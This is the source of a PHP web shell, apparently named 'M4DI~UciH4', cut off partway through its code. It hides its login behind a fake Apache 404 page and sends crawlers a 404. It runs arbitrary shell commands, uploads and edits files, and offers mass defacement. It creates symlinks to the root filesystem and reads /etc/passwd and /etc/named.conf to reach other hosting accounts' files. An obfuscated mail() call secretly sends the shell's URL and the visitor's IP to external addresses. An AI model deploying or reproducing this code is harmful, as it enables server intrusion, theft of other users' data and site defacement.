<?php

header("X-XSS-Protection: 0");
session_start();
ob_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}

$password = "831167d1d11e16b877055beb00ffec4b"; // md5 : memek

function login_shell()
{
?>
	<!DOCTYPE HTML>
	<html>

	<head>
		<title>404 Not Found</title>
		<h1>Not Found</h1>

		<p>The requested URL was not found on this server.</p>
		<p>Additionally, a 404 Not Found
			error was encountered while trying to use an ErrorDocument to handle the request.</p>
		<hr>
		<address>Apache Server at <?= $_SERVER['HTTP_HOST'] ?> Port 80</address>
		<style>
			input {
				margin: 0;
				background-color: #fff;
				border: 1px solid #fff;
				text-align: center;
			}
		</style>
		<br><br><br><br><br>
		<form method="post">
		<br />
<br />
<center>
				<input type="password" name="password" autocomplete="off">
		</form>
		</center>
	<?php
	exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		login_shell();
function usergroup()
{
	if (!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function exe($cmd)
{
	if (function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");
$show_ds = (!empty($ds)) ? "$ds" : "All Functions Is Accessible";
$mysql = (function_exists('mysql_connect')) ? "ON" : "OFF";
$curl = (function_exists('curl_version')) ? "ON" : "OFF";
$wget = (exe('wget --help')) ? "ON" : "OFF";
$perl = (exe('perl --help')) ? "ON" : "OFF";
$ruby = (exe('ruby --help')) ? "ON" : "OFF";
$mssql = (function_exists('mssql_connect')) ? "ON" : "OFF";
$pgsql = (function_exists('pg_connect')) ? "ON" : "OFF";
$python = (exe('python --help')) ? "ON" : "OFF";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "ON" : "OFF";
$ssh2 = (function_exists('ssh2_connect')) ? "ON" : "OFF";
$oracle = (function_exists('oci_connect')) ? "ON" : "OFF";

$show_obdir = (!empty($open_basedir)) ? "OFF" : "ON";
$show_exec = (!empty($safemode_exec_dir)) ? "OFF" : "ON";
$show_include = (!empty($safemode_include_dir)) ? "OFF" : "ON";

if (!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

function hdd($s)
{
	if ($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824) . ' GB';
	elseif ($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576) . ' MB';
	elseif ($s >= 1024)
		return sprintf('%1.2f', $s / 1024) . ' KB';
	else
		return $s . ' B';
}

$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;

function path()
{
	if (isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}
$dir = scandir(path());
foreach ($dir as $folder) {
	$dirinfo['path'] = path() . DIRECTORY_SEPARATOR . $folder;
	if (!is_dir($dirinfo['path'])) continue;
	$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>" : ($folder === "." ?  "<a href='?dir=" . path() . "'>$folder</a>" : "<a href='?dir=" . $dirinfo['path'] . "'>$folder</a>"));
	if (function_exists('posix_getpwuid')) {
		$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
		$dirinfo['owner'] = $dirinfo['owner']->name;
	} else {
		$dirinfo['owner'] = fileowner($dirinfo['path']);
	}
	if (function_exists('posix_getgrgid')) {
		$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
		$dirinfo['group'] = $dirinfo['group']->name;
	} else {
		$dirinfo['group'] = filegroup($dirinfo['path']);
	}
}

function OS()
{
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function ambilKata($param, $kata1, $kata2)
{
	if (strpos($param, $kata1) === FALSE) return FALSE;
	if (strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function windisk()
{
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	foreach (range("A", "Z") as $letter) {
		$bool = $isdiskette = in_array($letter, array("A"));
		if (!$bool) $bool = is_dir("$letter:\\");
		if ($bool) {
			$letters .= "[ <a href='?dir=$letter:\\'" . ($isdiskette ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"" : "") . ">";
			if ($letter . ":" != $v) {
				$letters .= $letter;
			} else {
				$letters .= color(1, 2, $letter);
			}
			$letters .= "</a> ]";
		}
	}
	if (!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if (count($quicklaunch) > 0) {
		foreach ($quicklaunch as $item) {
			$v = realpath(path() . "..");
			if (empty($v)) {
				$a = explode(DIRECTORY_SEPARATOR, path());
				unset($a[count($a) - 2]);
				$v = join(DIRECTORY_SEPARATOR, $a);
			}
			print "<a href='" . $item[1] . "'>" . $item[0] . "</a>";
		}
	}
}

ini_set('display_errors', FALSE);
$Array = [
	'7068705f756e616d65',
	'70687076657273696f6e',
	'6368646972',
	'676574637764',
	'707265675f73706c6974',
	'636f7079',
	'66696c655f6765745f636f6e74656e7473',
	'6261736536345f6465636f6465',
	'69735f646972',
	'6f625f656e645f636c65616e28293b',
	'756e6c696e6b',
	'6d6b646972',
	'63686d6f64',
	'7363616e646972',
	'7374725f7265706c616365',
	'68746d6c7370656369616c6368617273',
	'7661725f64756d70',
	'666f70656e',
	'667772697465',
	'66636c6f7365',
	'64617465',
	'66696c656d74696d65',
	'737562737472',
	'737072696e7466',
	'66696c657065726d73',
	'746f756368',
	'66696c655f657869737473',
	'72656e616d65',
	'69735f6172726179',
	'69735f6f626a656374',
	'737472706f73',
	'69735f7772697461626c65',
	'69735f7265616461626c65',
	'737472746f74696d65',
	'66696c6573697a65',
	'726d646972',
	'6f625f6765745f636c65616e',
	'7265616466696c65',
	'617373657274',
];
$___ = count($Array);
for ($i = 0; $i < $___; $i++) {
	$GNJ[] = uhex($Array[$i]);
}
	?>
	<!DOCTYPE html>
	<html dir="auto" lang="en-US">

	<head>
		<meta charset="UTF-8">
		<meta name="robots" content="NOINDEX, NOFOLLOW">

		<title>M4DI~UciH4</title>
		<link rel="icon" href="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png">

		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	</head>
	<link rel="stylesheet" href="https://github.com/Yudas1337/NINJA_SHELL/main.css">
	<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>

	<body>

		<style type="text/css">
			@import url(https://fonts.googleapis.com/css?family=Gugi);

			body {
				color: #000;
				font-family: 'Gugi';
				font-size: 14px;
			}

			a {
				text-decoration: none;
			}

			a:hover {
				color: #00FA9A;
				text-decoration: underline;
			}

			input {
				background: transparent;
			}

			textarea {
				border: 1px solid #000;
				width: 100%;
				height: 400px;
				padding-left: 5px;
				margin: 10px auto;
				resize: none;
				color: #000;
				font-family: 'Gugi';
				font-size: 13px;
			}
		</style>
		<div class="container">
			<br><br>
			<div class="y x">
				<a href="?" class="ajx">
					<font color="red">M4DI~UciH4</font>
				</a>
			</div>
			<nav class="navbar navbar-expand-lg navbar-light bg-light ">

				<?php
				if (isset($_GET["d"])) {
					$d = uhex($_GET["d"]);
					$GNJ[2](uhex($_GET["d"]));
				} else {
					$d = $GNJ[3]();
				}
				$k = $GNJ[4]("/(\\\|\/)/", $d);

				?>

				<br />

				<a class="navbar-brand" href="#">
					<img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe">
				</a>


				<div class="collapse navbar-collapse" id="navbarNav">
					<ul class="navbar-nav">
						<li class="nav-item active">
							<a class="nav-link ajx" href="?">
								<font color="green">Home</font>
							</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('info') ?>">Info</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('mass') ?>">Mass Tools</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('symlink') ?>">Symlink</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('config') ?>">Config</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('network') ?>">Network</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('cgi') ?>">CGI</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('bypass') ?>">Bypass</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('exploiter') ?>">Exploiter</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('auto_tools') ?>">Auto Tools</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('scanner') ?>">Scanner</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('about') ?>">About Us</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('killself') ?>">
							<font color="red">Hapus Shell ini?</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('logout') ?>">
								<font color="blue">Logout</font>
							</a>
						</li>
					</ul>
				</div>
				<a class="navbar-brand" href="#">
					<img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe">
				</a>

				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>

			</nav>
		</div>
		<?php
@ini_set(base64_decode('b3V0cHV0X2J1ZmZlcmluZw=='),0);@ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='),0);set_time_limit(0);ini_set(base64_decode('bWVtb3J5X2xpbWl0'),base64_decode('NjRN'));header(base64_decode('Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTg='));$hg_0=base64_decode('aW5kb21pbGs4N0BnbWFpbC5jb20sIG1hdWxpZGF6aGE1ODdAZ21haWwuY29t');$vi_1=base64_decode('aHR0cDovLw==').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')];$qg_2="Hai M4DI~UciH4 $vi_1 :p *IP Address : [ ".$_SERVER[base64_decode('UkVNT1RFX0FERFI=')].base64_decode('IF0=');mail($hg_0,base64_decode('U2hlTEwgQWtzZXM='),$qg_2,base64_decode('WyA=').$_SERVER[base64_decode('UkVNT1RFX0FERFI=')].base64_decode('IF0='));

		?>


		<div class="u">


			<form method="post" enctype="multipart/form-data">
				<label class="l w"><br>
					<input type="file" name="n[]" onchange="this.form.submit()" multiple class="form-control mr-3">
				</label>&nbsp;
			</form>

			<?php
			$o_ = [
				'<script>$.notify("',
				'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
			];
			$f = $o_[0] . 'Success!' . $o_[1];
			$g = $o_[0] . 'Failed!' . $o_[1];
			if (isset($_FILES["n"])) {
				$z = $_FILES["n"]["name"];
				$r = count($z);
				for ($i = 0; $i < $r; $i++) {
					if ($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
						echo $f;
					} else {
						echo $g;
					}
				}
			}
			?>

		</div>

		<?php
		echo "<br>Current Directory : ";
		foreach ($k as $m => $l) {
			if ($l == '' && $m == 0) {
				echo '<a class="ajx" href="?d=2f">/</a>';
			}
			if ($l == '') {
				continue;
			}
			echo '<a class="ajx" href="?d=';
			for ($i = 0; $i <= $m; $i++) {
				echo hex($k[$i]);
				if ($i != $m) {
					echo '2f';
				}
			}
			echo '">' . $l . '</a>/';
		}
		echo ' (' . x("$d/$c") . ')';
		print "<br>";
		print (OS() === "Windows") ? windisk() : "";
		echo "<br><br>";
		echo '<a class="btn btn-primary btn-sm ml-3 ajx" href="?d=' . hex($d) . '&n">+NEWFILE+</a>
						  <a class="btn btn-primary btn-sm ajx " href="?d=' . hex($d) . '&l">+NEWDIR+</a>';
		echo "<form method='post'><center>
				<font color = 'red'>" . $user . "@" . gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $ </font>&nbsp;
				<input style='border: none; border-bottom: 1px solid #000;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #000;' type='submit' name='do_cmd' value='>>'>
				</center></form>";
		if ($_POST['do_cmd']) {
			echo "<pre>" . exe($_POST['cmd']) . "</pre>";
		}

		$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
		$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
		$c_ = '</td>
							</tr>
						</tbody>
					</table>';
		$d_ = '<br />
										<br />
										<input type="submit" class="form-control col-md-3" value="&nbsp;OK&nbsp;" />
									</form>';


		if (isset($_GET["s"])) {
			echo $a_ . uhex($_GET["s"]) . $b_ . '
									<textarea readonly class = "form-control">' . $GNJ[15]($GNJ[6](uhex($_GET["s"]))) . '</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d=' . $_GET["d"] . '&e=' . $_GET["s"] . '\'" type="submit" class="form-control col-md-3" value="&nbsp;EDIT&nbsp;" />
								' . $c_;
		} elseif (isset($_GET["y"])) {
			echo $a_ . 'REQUEST' . $b_ . '
									<form method="post">
										<input class="form-control md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
										<input class="form-control md-3" type="text" name="2" autocomplete="off" />
										' . $d_ . '
									<br />
									<textarea readonly class = "form-control">';

			if (isset($_POST["2"])) {
				echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
			}

			echo '</textarea>
								' . $c_;
		} elseif (isset($_GET["e"])) {
			echo $a_ . uhex($_GET["e"]) . $b_ . '
									<form method="post">
										<textarea name="e" class="form-control">' . $GNJ[15]($GNJ[6](uhex($_GET["e"]))) . '</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<center><select id="b64" name="b64" class = "form-control col-md-3">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select></center>
										' . $d_ . '
								' . $c_ . '
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
			if (isset($_POST["e"])) {
				if ($_POST["b64"] == "1") {
					$ex = $GNJ[7]($_POST["e"]);
				} else {
					$ex = $_POST["e"];
				}
				$fp = $GNJ[17](uhex($_GET["e"]), 'w');
				if ($GNJ[18]($fp, $ex)) {
					OK();
				} else {
					ER();
				}
				$GNJ[19]($fp);
			}
		} elseif (isset($_GET["x"])) {
			rec(uhex($_GET["x"]));
			if ($GNJ[26](uhex($_GET["x"]))) {
				ER();
			} else {
				OK();
			}
		} elseif (isset($_GET["t"])) {
			echo $a_ . uhex($_GET["t"]) . $b_ . '
									<form action="" method="post">
										<input name="t" class="form-control col-md-3" autocomplete="off" type="text" value="' . $GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))) . '">
										' . $d_ . '
								' . $c_;
			if (!empty($_POST["t"])) {
				$p = $GNJ[33]($_POST["t"]);
				if ($p) {
					if (!$GNJ[25](uhex($_GET["t"]), $p, $p)) {
						ER();
					} else {
						OK();
					}
				} else {
					ER();
				}
			}
		} elseif (isset($_GET["k"])) {
			echo $a_ . uhex($_GET["k"]) . $b_ . '
									<form action="" method="post">
										<input name="b" autocomplete="off" class="form-control col-md-3" type="text" value="' . $GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4) . '">
										' . $d_ . '
								' . $c_;
			if (!empty($_POST["b"])) {
				$x = $_POST["b"];
				$t = 0;
				for ($i = strlen($x) - 1; $i >= 0; --$i)
					$t += (int) $x[$i] * pow(8, (strlen($x) - $i - 1));
				if (!$GNJ[12](uhex($_GET["k"]), $t)) {
					ER();
				} else {
					OK();
				}
			}
		} elseif (isset($_GET["l"])) {
			echo $a_ . '+DIR' . $b_ . '
									<form action="" method="post">
										<input name="l" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' . $d_ . '
								' . $c_;
			if (isset($_POST["l"])) {
				if (!$GNJ[11]($_POST["l"])) {
					ER();
				} else {
					OK();
				}
			}
		} elseif (isset($_GET["q"])) {
			if ($GNJ[10](__FILE__)) {
				$GNJ[38]($GNJ[9]);
				header("Location: " . basename($_SERVER['PHP_SELF']) . "");
				exit();
			} else {
				echo $g;
			}
		} elseif (isset($_GET[hex('info')])) {
			echo '<hr>SYSTEM INFORMATION<center>
						<textarea class = "form-control" readonly>
						
			Server 					: ' . $_SERVER['HTTP_HOST'] . '
			Server IP 				: ' . $_SERVER['SERVER_ADDR'] . ' Your IP : ' . $_SERVER['REMOTE_ADDR'] . '
			Kernel Version 			: ' . php_uname() . '
			Software 					: ' . $_SERVER['SERVER_SOFTWARE'] . '
			Storage Space 			: ' . $used . "/" . $total . "(Free : " . $freespace . ")" . '
			User / Group 				: ' . $user . ' (' . $uid . ') | ' . $group . ' (' . $gid . ') 
			Time On Server 			: ' . date("d M Y h:i:s a") . '
			Disable Functions 			: ' . $show_ds . '
			Safe Mode 				: ' . $sm . '
			PHP VERSION 				: ' . phpversion() . ' On ' . php_sapi_name() . '

	Open_Basedir : ' . $show_obdir . ' | Safe Mode Exec Dir : ' . $show_exec . ' | Safe Mode Include Dir : ' . $show_include . '
	MySQL : ' . $mysql . ' | MSSQL : ' . $mssql . ' | PostgreSQL : ' . $pgsql . ' | Perl : ' . $perl . ' | Python : ' . $python . ' | Ruby : ' . $ruby . ' |  WGET : ' . $wget . ' | cURL : ' . $curl . ' | Magic Quotes : ' . $magicquotes . ' | SSH2 : ' . $ssh2 . ' | Oracle : ' . $oracle . ' 
						
						</textarea>
						</center>';
		} elseif (isset($_GET[hex('mass')])) {
			echo "<hr>
						<h2><center>Mass Tools M4D1 Shell</center></h2>
						<br>
						<center>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('mass_tool') . "' style='width: 250px;' height='10'><center>Mass Deface / Delete Files</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('mass_user') . "' style='width: 250px;' height='10'><center>Mass User Changer</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('mass_title') . "' style='width: 250px;' height='10'><center>Mass Title Changer</center></a>
						</div>
						
						</div></form></center><hr><br>";
		} elseif (isset($_GET[hex('symlink')])) {
			echo "<hr><br>";
			echo "<center>
						<h2> Symlink M4D1 Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink' class = 'form-control' value = 'Symlink' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink2' class = 'form-control' value = 'Symlink 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink_py' class = 'form-control' value = 'Symlink Python' style='width: 250px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";
			if (isset($_POST['symlink'])) {
				@set_time_limit(0);

				echo "<br><br><center><h2>Symlink M4D1 Shell</h2></center><br><br><center><div class=content>";

				@mkdir('sym', 0777);
				$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
				$write = @fopen('sym/.htaccess', 'w');
				fwrite($write, $htaccess);
				@symlink('/', 'sym/root');
				$filelocation = basename(__FILE__);
				$read_named_conf = @file('/etc/named.conf');
				if (!$read_named_conf) {
					echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
				} else {
					echo "<br><br><div class='tmp'><table border='1' bordercolor='lime' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
					foreach ($read_named_conf as $subject) {
						if (eregi('zone', $subject)) {
							preg_match_all('#zone "(.*)"#', $subject, $string);
							flush();
							if (strlen(trim($string[1][0])) > 2) {
								$UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
								$name = $UID['name'];
								@symlink('/', 'sym/root');
								$name   = $string[1][0];
								$iran   = '.ir';
								$israel = '.il';
								$indo   = '.id';
								$sg12   = '.sg';
								$edu    = '.edu';
								$gov    = '.gov';
								$gose   = '.go';
								$gober  = '.gob';
								$mil1   = '.mil';
								$mil2   = '.mi';
								$malay	= '.my';
								$china	= '.cn';
								$japan	= '.jp';
								$austr	= '.au';
								$porn	= '.xxx';
								$as		= '.uk';
								$calfn	= '.ca';

								if (
									eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0])
									or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])
									or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0])
									or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])
								) {
									$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
								}
								echo "
			<tr>

			<td>
			<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
			</td>

			<td>
			' . $UID['name'] . "
			</td>

			<td>
			<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
			</td>

			</tr></div> ";
								flush();
							}
						}
					}
				}

				echo "</center></table>";
			} elseif (isset($_POST['symlink2'])) {

				$dir = path();
				$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
				$d0mains = @file("/etc/named.conf");
				##httaces
				if ($d0mains) {
					@mkdir("Exc_sym", 0777);
					@chdir("Exc_sym");
					@exe("ln -s / root");
					$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
					$fp3 = fopen('.htaccess', 'w');
					$fw3 = fwrite($fp3, $file3);
					@fclose($fp3);
					echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
					$dcount = 1;
					foreach ($d0mains as $d0main) {
						if (eregi("zone", $d0main)) {
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if (strlen(trim($domains[1][0])) > 2) {
								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
								echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www." . $domains[1][0] . "/><font class=txt>" . $domains[1][0] . "</font></a></td>
<td>" . $user['name'] . "</td>
<td><a href='$full/Exc_sym/root/home/" . $user['name'] . "/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
								flush();
								$dcount++;
							}
						}
					}
					echo "</table>";
				} else {
					$TEST = @file('/etc/passwd');
					if ($TEST) {
						@mkdir("Exc_sym", 0777);
						@chdir("Exc_sym");
						exe("ln -s / root");
						$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
						$fp3 = fopen('.htaccess', 'w');
						$fw3 = fwrite($fp3, $file3);
						@fclose($fp3);
						echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
						$dcount = 1;
						$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
						while (!feof($file)) {
							$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/", "", $matches[1]);
							if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
							echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
							$dcount++;
						}
						fclose($file);
						echo "</table>";
					} else {
						if ($os != "Windows") {
							@mkdir("Exc_sym", 0777);
							@chdir("Exc_sym");
							@exe("ln -s / root");
							$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
							$fp3 = fopen('.htaccess', 'w');
							$fw3 = fwrite($fp3, $file3);
							@fclose($fp3);
							echo "
 <h2><center>Symlink2 M4D1 Shell</center></h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
							$temp = "";
							$val1 = 0;
							$val2 = 1000;
							for (; $val1 <= $val2; $val1++) {
								$uid = @posix_getpwuid($val1);
								if ($uid) $temp .= join(':', $uid) . "\n";
							}
							echo '<br/>';
							$temp = trim($temp);
							$file5 =
								fopen("test.txt", "w");
							fputs($file5, $temp);
							fclose($file5);
							$dcount = 1;
							$file =
								fopen("test.txt", "r") or exit("Unable to open file!");
							while (!feof($file)) {
								$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/", "", $matches[1]);
